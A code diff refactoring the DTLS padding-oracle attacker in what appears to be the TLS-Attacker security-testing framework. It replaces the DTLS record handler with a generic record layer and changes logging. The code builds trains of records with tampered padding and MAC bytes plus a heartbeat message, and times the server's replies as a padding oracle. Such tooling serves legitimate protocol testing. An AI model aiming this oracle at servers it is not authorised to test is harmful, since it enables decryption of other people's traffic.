@@ -9,8 +9,6 @@
 package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.tlsattacker.attacks.config.DtlsPaddingOracleAttackCommandConfig;
-import de.rub.nds.tlsattacker.dtls.record.DtlsRecord;
-import de.rub.nds.tlsattacker.dtls.record.DtlsRecordHandler;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.tlsattacker.tls.constants.AlertDescription;
@@ -23,6 +21,9 @@ import de.rub.nds.tlsattacker.tls.protocol.message.HeartbeatMessage;
 import de.rub.nds.tlsattacker.tls.protocol.parser.HeartbeatMessageParser;
 import de.rub.nds.tlsattacker.tls.protocol.preparator.AlertPreparator;
 import de.rub.nds.tlsattacker.tls.protocol.preparator.HeartbeatMessagePreparator;
+import de.rub.nds.tlsattacker.tls.record.AbstractRecord;
+import de.rub.nds.tlsattacker.tls.record.Record;
+import de.rub.nds.tlsattacker.tls.record.layer.RecordLayer;
 import de.rub.nds.tlsattacker.tls.workflow.TlsConfig;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
@@ -40,6 +41,7 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.locks.LockSupport;
+import java.util.logging.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -55,7 +57,7 @@ public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackC
 
     private TlsContext tlsContext;
 
-    private DtlsRecordHandler recordHandler;
+    private RecordLayer recordLayer;
     private List<TLSAction> actionList;
     private UDPTransportHandler transportHandler;
 
@@ -131,7 +133,8 @@ public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackC
                 fileWriter.close();
             }
         } catch (IOException e) {
-            LOGGER.info(e.getLocalizedMessage());
+            LOGGER.info("Encountered IOException while Executing Attack");
+            LOGGER.debug(e.getLocalizedMessage());
         }
 
         closeDtlsConnectionGracefully();
@@ -170,8 +173,7 @@ public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackC
 
             if (serverAnswer != null && serverAnswer.length > 1) {
                 HeartbeatMessage receivedHbMessage = new HeartbeatMessage(tlsConfig);
-                List<de.rub.nds.tlsattacker.tls.record.Record> parsedReceivedRecords = recordHandler
-                        .parseRecords(serverAnswer);
+                List<AbstractRecord> parsedReceivedRecords = recordLayer.parseRecords(serverAnswer);
                 if (parsedReceivedRecords.size() != 1) {
                     LOGGER.info("Unexpected number of records parsed from server. Train: {}", trainInfo);
 
@@ -196,7 +198,7 @@ public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackC
         } catch (SocketTimeoutException e) {
             LOGGER.info("Received timeout when waiting for heartbeat answer. Train: {}", trainInfo);
         } catch (Exception e) {
-            LOGGER.info(e.getMessage());
+            LOGGER.debug(e.getMessage());
         }
         return -1;
     }
@@ -218,24 +220,24 @@ public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackC
 
     private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData, HeartbeatMessage heartbeatMessage) {
         byte[][] train = new byte[n + 1][];
-        List<de.rub.nds.tlsattacker.tls.record.Record> records = new ArrayList<>();
+        List<AbstractRecord> records = new ArrayList<>();
         ApplicationMessage apMessage = new ApplicationMessage(tlsConfig);
         SendAction action = new SendAction(apMessage);
         actionList.add(action);
-        DtlsRecord record;
+        Record record;
         apMessage.setData(messageData);
 
         for (int i = 0; i < n; i++) {
-            record = new DtlsRecord();
+            record = new Record();
             record.setPadding(modifiedPaddingArray);
             records.add(record);
-            train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
+            train[i] = recordLayer.prepareRecords(messageData, ProtocolMessageType.APPLICATION_DATA, records);
             records.remove(0);
         }
 
-        records.add(new DtlsRecord());
+        records.add(new Record());
         action.getConfiguredMessages().add(heartbeatMessage);
-        train[n] = recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
+        train[n] = recordLayer.prepareRecords(heartbeatMessage.getCompleteResultingMessage().getValue(),
                 ProtocolMessageType.HEARTBEAT, records);
 
         return train;
@@ -244,27 +246,27 @@ public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackC
     private byte[][] createInvalidMacMessageTrain(int n, byte[] applicationMessageContent,
             HeartbeatMessage heartbeatMessage) {
         byte[][] train = new byte[n + 1][];
-        List<de.rub.nds.tlsattacker.tls.record.Record> records = new ArrayList<>();
+        List<AbstractRecord> records = new ArrayList<>();
         ApplicationMessage apMessage = new ApplicationMessage(tlsConfig);
         SendAction action = new SendAction(apMessage);
         actionList.add(action);
         apMessage.setData(applicationMessageContent);
 
-        DtlsRecord record = new DtlsRecord();
+        Record record = new Record();
         record.setMac(modifiedMacArray);
         record.setPadding(modifiedPaddingArray);
         records.add(record);
-        byte[] recordBytes = recordHandler.wrapData(applicationMessageContent, ProtocolMessageType.APPLICATION_DATA,
-                records);
+        byte[] recordBytes = recordLayer.prepareRecords(applicationMessageContent,
+                ProtocolMessageType.APPLICATION_DATA, records);
 
         for (int i = 0; i < n; i++) {
             train[i] = recordBytes;
         }
 
         records.remove(0);
-        records.add(new DtlsRecord());
+        records.add(new Record());
         action.getConfiguredMessages().add(heartbeatMessage);
-        train[n] = (recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
+        train[n] = (recordLayer.prepareRecords(heartbeatMessage.getCompleteResultingMessage().getValue(),
                 ProtocolMessageType.HEARTBEAT, records));
 
         return train;
@@ -273,23 +275,23 @@ public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackC
     private void closeDtlsConnectionGracefully() {
         AlertMessage closeNotify = new AlertMessage(tlsConfig);
         closeNotify.setConfig(AlertLevel.WARNING, AlertDescription.CLOSE_NOTIFY);
-        List<de.rub.nds.tlsattacker.tls.record.Record> records = new ArrayList<>();
-        records.add(new DtlsRecord());
+        List<AbstractRecord> records = new ArrayList<>();
+        records.add(new Record());
 
+        AlertPreparator preparator = new AlertPreparator(new TlsContext(tlsConfig), closeNotify);
+        preparator.prepare();
         try {
-            AlertPreparator preparator = new AlertPreparator(new TlsContext(tlsConfig), closeNotify);
-            preparator.prepare();
-            transportHandler.sendData(recordHandler.wrapData(closeNotify.getCompleteResultingMessage().getValue(),
+            transportHandler.sendData(recordLayer.prepareRecords(closeNotify.getCompleteResultingMessage().getValue(),
                     ProtocolMessageType.ALERT, records));
-        } catch (IOException e) {
-            LOGGER.error(e.getLocalizedMessage());
+        } catch (IOException ex) {
+            ex.printStackTrace();
         }
     }
 
     private void initExecuteAttack() {
         tlsContext = new TlsContext(tlsConfig);
         workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(), tlsContext);
-        recordHandler = (DtlsRecordHandler) tlsContext.getRecordHandler();
+        recordLayer = tlsContext.getRecordLayer();
         trace = tlsContext.getWorkflowTrace();
         actionList = trace.getTLSActions();
         modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
